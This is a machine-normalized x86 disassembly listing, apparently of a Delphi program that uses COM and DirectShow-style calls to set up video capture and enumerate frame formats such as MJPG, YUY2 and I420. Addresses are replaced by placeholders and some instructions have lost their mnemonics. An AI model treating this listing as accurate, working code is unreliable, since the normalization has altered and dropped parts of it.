call sub_40700c
push eax
mov eax [ rw-data ]
push eax
push 0x3
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov esi eax
test esi 0x80000000
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ebd
lea eax [ ebp - 0x48 ]
mov edx [ r-xdata ]
call sub_4060ac
retn
lea eax [ ebx + 0x24 ]
call sub_40700c
push eax
push r-xdata
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov esi eax
test esi 0x80000000
jne r-xdata
lea eax [ ebx + 0x2c ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov esi eax
test esi 0x80000000
jne r-xdata
lea eax [ ebx + 0x34 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x24 ]
push eax
mov eax [ eax ]
call [ eax ]
mov esi eax
test esi 0x80000000
jne r-xdata
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
lea eax [ ebp - 0x48 ]
xor ecx ecx
mov edx 0x48
call sub_403af4
mov eax [ rw-data ]
push edi
mov esi eax
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ rw-data ]
push edi
mov esi eax
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov esi eax
test esi 0x80000000
jne r-xdata
push edi
mov eax [ ebx + 0x40 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
lea eax [ ebx + 0x18 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
push 0x3
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov esi eax
test esi 0x80000000
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi [ ebx + 0x3c ]
mov [ esi + 0xc ] eax
lea eax [ ebx + 0x40 ]
mov edx esi
test edx edx
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ eax ]
call [ eax ]
mov esi eax
test esi 0x80000000
jne r-xdata
call sub_407024
sub edx 0xffffffe8
lea eax [ ebx + 0x8 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ eax ]
call [ eax ]
mov esi eax
test esi 0x80000000
jne r-xdata
lea eax [ ebx + 0x10 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ eax ]
call [ eax ]
mov esi eax
test esi 0x80000000
jne r-xdata
push 0x0
push 0x8001
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
mov esi eax
sub_462ed8
push ebp
mov ebp esp
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46308b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ esi ] 0x0
lea eax [ ebp - 0xc ]
call sub_40700c
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0xc ]
call sub_40700c
push eax
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463092
lea eax [ ebp - 0x38 ]
mov edx 0x5
call sub_405554
lea eax [ ebp - 0x20 ]
call sub_411650
lea eax [ ebp - 0x10 ]
call sub_40700c
lea eax [ ebp - 0xc ]
call sub_40700c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_40700c
lea eax [ ebp - 0x10 ]
call sub_40700c
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x20 ]
call sub_414a44
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
call sub_409b7c
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_4097dc
mov eax [ ebp - 0x28 ]
push eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_409b7c
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x30 ]
call sub_4097dc
mov edx [ ebp - 0x30 ]
pop eax
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax 0x2
jne r-xdata
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x23
sete al
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x8 ]
call sub_409b7c
mov edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_405584
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov ebx eax
test ebx ebx
sete [ esi ]
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
sub eax 0x30
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
sete al
jmp r-xdata
test al al
je r-xdata
sub_4630c8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
call sub_4059cc
xor eax eax
push ebp
push sub_463223
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_405530
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_409b7c
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_4055c8
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x14 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
push 0x3
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov [ ebp - 0x18 ] eax
test [ ebp - 0x15 ] 0x80
jne r-xdata
mov [ ebp - 0x18 ] 0x80004003
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46322a
lea eax [ ebp - 0x20 ]
call sub_405530
lea eax [ ebp - 0x14 ]
call sub_40700c
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
lea eax [ ebp - 0x4 ]
call sub_40700c
push 0x0
lea eax [ ebp - 0x4 ]
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov [ ebp - 0x18 ] eax
test [ ebp - 0x15 ] 0x80
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov [ ebp - 0x18 ] 0x80004005
jmp r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4631d2
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea edx [ ebp - 0x19 ]
mov eax [ ebp - 0x10 ]
call sub_462ed8
pop ecx
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4631d7
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
call sub_404f40
mov [ ebp - 0x18 ] 0x80004005
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46322a
lea eax [ ebp - 0x20 ]
call sub_405530
lea eax [ ebp - 0x14 ]
call sub_40700c
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
cmp [ ebp - 0x18 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4631d2
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea edx [ ebp - 0x19 ]
mov eax [ ebp - 0x10 ]
call sub_462ed8
pop ecx
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
sub_463244
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
push esp
mov eax [ ebx + 0x4 ]
push eax
call GetClientRect
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x9c ]
sub_46327c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x74 ]
test eax 0x80000000
jne r-xdata
pop ebx
retn
push 0x42000000
mov eax [ ebx + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
test eax 0x80000000
jne r-xdata
mov eax ebx
call sub_463244
push 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x4c ]
test eax 0x80000000
sub_4632c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x28
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov ebx eax
test ebx 0x80000000
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x30
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x28
call sub_40700c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov ebx eax
test ebx 0x80000000
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x30
call sub_40700c
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax 0x10
call sub_402f00
mov ebx eax
mov eax 0x10
call sub_402f00
mov edx [ rw-data ]
mov esi edx
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ rw-data ]
mov esi edx
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor edx edx
push ebp
push sub_46344c
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov ebx eax
test ebx 0x80000000
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x2c ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
push edx
push eax
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
mov ebx eax
push 0x0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
push edx
push eax
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
mov ebx eax
jmp r-xdata
test ebx 0x80000000
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
mov ebx eax
test ebx 0x80000000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
call sub_46327c
mov ebx eax
test ebx 0x80000000
jne r-xdata
sub_463504
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_463591
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ edi + 0x38 ]
call sub_40700c
mov [ edi + 0x44 ] bl
mov eax [ edi + 0x14 ]
push eax
mov eax [ edi + 0x18 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov esi eax
test esi 0x80000000
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463598
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea eax [ edi + 0x38 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4630c8
mov esi eax
test esi 0x80000000
jne r-xdata
mov eax edi
call sub_4637e4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax edi
call sub_4634f8
mov esi eax
sub_4635a4
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x114 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_4636f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0xc ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_40700c
push eax
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4636f9
lea eax [ ebp - 0x114 ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4060f8
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_40700c
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40700c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x114 ]
mov edx [ r-xdata ]
call sub_4060ac
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x110 ] 0x0
jne r-xdata
mov edx [ ebp - 0x114 ]
mov eax esi
call sub_4635a4
mov eax [ ebp - 0xc ]
push eax
mov eax [ esi + 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ esi + 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov eax [ ebp - 0x114 ]
push eax
mov eax [ esi + 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
sub_463718
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
push 0x1
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov [ ebx + 0x1c ] 0x0
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x8001
push 0x0
mov eax [ ebx + 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
pop ebx
retn
push 0x0
mov eax [ ebx + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x4c ]
push 0x0
mov eax [ ebx + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x74 ]
sub_463778
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
retn
test dl dl
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov [ ebx + 0x1c ] 0x0
cmp [ ebx + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
mov [ ebx + 0x1c ] 0x2
jmp r-xdata
sub_4637ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40700c
mov eax esi
call sub_40700c
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
pop esi
pop ebx
retn
sub_4637e4
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_463a86
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ esi + 0x50 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4637ac
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x14 ] 0x1
jle r-xdata
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463a8d
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
mov [ ebp - 0x1d ] 0x0
mov eax [ ebp - 0x14 ]
sub eax 0x2
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x24 ] eax
xor ebx ebx
cmp [ ebp - 0x1d ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x24 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x24 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x10 ]
mov eax [ rw-data ]
call sub_4628b8
test al al
jne r-xdata
mov [ ebp - 0x1d ] 0x1
lea eax [ ebx + ebx * 2 ]
mov edx [ esi + 0x50 ]
push esi
lea esi [ edx + eax * 8 ]
lea edi [ ebp - 0xc0 ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov edx [ esi + 0x50 ]
mov ecx [ esi + 0x50 ]
push esi
lea esi [ edx + eax * 8 + 0x18 ]
lea edi [ ecx + eax * 8 ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov edx [ esi + 0x50 ]
push esi
lea edi [ edx + eax * 8 + 0x18 ]
lea esi [ ebp - 0xc0 ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
lea eax [ ebx + ebx * 2 ]
mov edx [ esi + 0x50 ]
mov edx [ edx + eax * 8 ]
mov ecx [ esi + 0x50 ]
cmp edx [ ecx + eax * 8 + 0x18 ]
jne r-xdata
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov edi [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
add eax 0x14
mov [ ebp - 0x28 ] eax
test [ ebp - 0x5 ] 0x80
jne r-xdata
mov eax [ ebp - 0x14 ]
inc eax
push eax
lea eax [ esi + 0x50 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov edi [ ebp - 0x14 ]
lea edi [ edi + edi * 2 ]
mov eax [ esi + 0x50 ]
mov [ eax + edi * 8 + 0xc ] ebx
mov eax [ esi + 0x50 ]
mov edx [ ebp - 0x28 ]
mov edx [ edx ]
mov [ eax + edi * 8 ] edx
mov eax [ esi + 0x50 ]
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x4 ]
mov [ eax + edi * 8 + 0x4 ] edx
mov eax [ esi + 0x50 ]
mov edx [ ebp - 0x10 ]
mov [ eax + edi * 8 + 0x10 ] edx
mov eax [ esi + 0x50 ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x28 ]
mov [ eax + edi * 8 + 0x8 ] edx
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x10 ]
mov eax [ rw-data ]
call sub_4628b8
test al al
je r-xdata
cmp edi 0x47504a4d
je r-xdata
lea edx [ ebx + ebx * 2 ]
mov ecx [ esi + 0x50 ]
mov edx [ ecx + edx * 8 ]
lea ecx [ ebx + ebx * 2 ]
mov edi [ esi + 0x50 ]
cmp edx [ edi + ecx * 8 + 0x18 ]
jg r-xdata
inc ebx
dec [ ebp - 0x24 ]
jne r-xdata
mov edx [ esi + 0x50 ]
mov edx [ edx + eax * 8 + 0x4 ]
mov ecx [ esi + 0x50 ]
cmp edx [ ecx + eax * 8 + 0x1c ]
jle r-xdata
mov eax [ esi + 0x50 ]
lea edx [ eax + edi * 8 + 0x14 ]
mov eax [ ebp - 0x10 ]
add eax 0x10
mov ecx 0x4
call sub_4030fc
mov eax [ esi + 0x50 ]
mov edx [ r-xdata ]
mov [ eax + edi * 8 + 0x14 ] edx
jmp r-xdata
cmp edi 0x32595559
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
mov edx [ ebp - 0x28 ]
imul [ edx + 0x4 ]
add eax eax
mov edx [ ebp - 0x10 ]
cmp eax [ edx + 0x28 ]
je r-xdata
cmp edi 0x564e5559
je r-xdata
cmp edi 0x30323449
je r-xdata
cmp edi 0x56595559
jne r-xdata
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
mov edx [ ebp - 0x28 ]
imul [ edx + 0x4 ]
lea eax [ eax + eax * 2 ]
shr eax 0x1
mov edx [ ebp - 0x10 ]
cmp eax [ edx + 0x28 ]
jne r-xdata
cmp edi 0x32315659
je r-xdata
cmp edi 0x56555949
jne r-xdata
sub_463a9c
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463b65
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jl r-xdata
mov edi 0x1
jmp r-xdata
mov eax [ ebx + 0x50 ]
call sub_40676c
cmp esi eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463b6c
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
lea eax [ esi + esi * 2 ]
mov edx [ ebx + 0x50 ]
mov esi [ edx + eax * 8 + 0xc ]
mov eax [ ebx + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4637ac
mov edi eax
test edi 0x80000000
jne r-xdata
mov eax [ ebx + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov edi eax
test edi 0x80000000
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edi eax
sub_463b78
push ebp
mov ebp esp
add esp 0xfffffae8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x50 ] ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x4c ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_463cb0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ edi ] eax
mov eax [ ebp - 0x50 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebx + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov eax [ ebx + 0x38 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4637ac
mov esi eax
test esi esi
jne r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x38 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax [ ebx + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463cb7
lea eax [ ebp - 0x4c ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov esi eax
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
mov ecx [ r-xdata ]
call sub_406208
mov edx [ rw-data ]
mov eax [ ebp - 0x54 ]
add eax 0x2c
call sub_4628b8
test al al
je r-xdata
lea eax [ ebp - 0x4c0 ]
xor ecx ecx
mov edx 0x468
call sub_403af4
mov eax [ ebp - 0x54 ]
mov eax [ eax + 0x44 ]
push esi
push edi
mov esi eax
lea edi [ ebp - 0x518 ]
mov ecx 0x16
[ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x4c0 ]
lea eax [ ebp - 0x518 ]
mov ecx 0x58
call sub_4030fc
mov eax [ ebp - 0x48c ]
mov [ edi ] eax
mov eax [ ebp - 0x488 ]
cdq
xor eax edx
sub eax edx
mov edx [ ebp - 0x50 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x480 ]
mov [ eax ] edx
sub_463cc4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x48 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4c ] edx
mov eax [ eax + 0x3c ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
